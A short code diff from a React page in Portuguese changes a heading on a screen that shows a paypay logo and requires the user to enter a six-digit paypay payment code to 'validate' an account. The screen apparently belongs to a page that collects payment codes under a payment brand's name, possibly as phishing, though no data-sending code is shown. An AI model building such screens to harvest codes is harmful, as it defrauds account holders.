@@ -660,7 +660,7 @@ function Index() {
                     <img src={logoPaypay} alt="paypay" className="w-10 h-10 object-contain" />
                   </div>
                   <div className="space-y-2">
-                    <h2 className="text-2xl font-bold">Código de Pagamento Obrigatório</h2>
+                    <h2 className="text-2xl font-bold">Código de pagamento paypay</h2>
                     <p className="text-muted-foreground text-sm">
                       É obrigatório introduzir os <span className="font-bold text-foreground">6 dígitos</span> do seu código de pagamento paypay para validar a conta <span className="font-bold text-foreground">{accountNumber || "555555555"}</span>.
                     </p>
